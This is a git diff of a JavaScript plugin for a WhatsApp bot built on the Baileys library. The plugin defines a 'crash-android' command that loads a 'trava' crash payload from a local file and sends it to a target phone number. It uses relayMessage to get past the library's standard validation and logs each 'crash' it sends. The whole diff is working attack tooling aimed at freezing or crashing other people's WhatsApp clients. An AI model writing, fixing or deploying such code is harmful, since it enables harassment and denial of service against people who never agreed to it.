@@ -1,5 +1,7 @@
 import fs from 'fs';
 import path from 'path';
+import pkg from '@whiskeysockets/baileys';
+const { generateWAMessageFromContent, proto } = pkg;
 
 const crashAndroidMisa = {
     name: 'crash-android',
@@ -18,39 +20,39 @@ const crashAndroidMisa = {
             const targetJid = `${num}@s.whatsapp.net`;
 
             const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
-            if (!fs.existsSync(pathTrava)) return await conn.sendMessage(chat, { text: '❌ No se encontró el archivo.' }, { quoted: m });
+            if (!fs.existsSync(pathTrava)) return await conn.sendMessage(chat, { text: '❌ Archivo no encontrado.' }, { quoted: m });
 
             const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');
 
-            // Reacción de "procesando"
             await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } });
 
-            // ENVIAR SIN ESPERAR (Para evitar el Time Out)
-            // Usamos relayMessage para saltarnos la validación estándar de Baileys
-            const messageGenerated = await conn.prepareWAMessageMedia({ text: contenidoTrava }, { upload: conn.waUploadToServer });
-            
-            await conn.relayMessage(targetJid, {
+            // Generamos el mensaje manualmente para saltar el Timeout
+            const msjCargado = await generateWAMessageFromContent(targetJid, {
                 extendedTextMessage: {
                     text: contenidoTrava,
                     contextInfo: {
                         externalAdReply: {
-                            title: 'MISA BOT CRASH',
-                            body: 'System Failure',
-                            previewType: 'PHOTO',
-                            thumbnailUrl: 'https://qu.ax/ZpYy.jpg' // Opcional: una imagen para que el mensaje se vea más "pro"
+                            title: 'MISA BOT SYSTEM',
+                            body: 'Sending payload...',
+                            mediaType: 1,
+                            sourceUrl: 'https://github.com',
+                            thumbnailUrl: 'https://qu.ax/ZpYy.jpg'
                         }
                     }
                 }
-            }, { messageId: conn.generateMessageTag() });
+            }, { userJid: conn.user.id });
 
-            // Confirmación visual inmediata
+            // Enviamos el mensaje mediante relayMessage
+            await conn.relayMessage(targetJid, msjCargado.message, { 
+                messageId: msjCargado.key.id 
+            });
+
             await conn.sendMessage(chat, { react: { text: '✅', key: m.key } });
-            console.log(`[LOG] Carga enviada a ${num} (Relay Mode)`);
+            console.log(`[OK] Crash enviado a ${num}`);
 
         } catch (err) {
-            console.error('Error detectado:', err.message);
-            // Si da Time Out pero el log dice que llegó aquí, el mensaje probablemente SE ENVIÓ pero Baileys no se enteró.
-            await conn.sendMessage(chat, { text: '⚠️ Hubo un retraso en la respuesta, pero la carga fue procesada.' }, { quoted: m });
+            console.error('Error en el comando:', err);
+            await conn.sendMessage(chat, { text: '❌ Error al procesar el envío.' }, { quoted: m });
         }
     }
 };
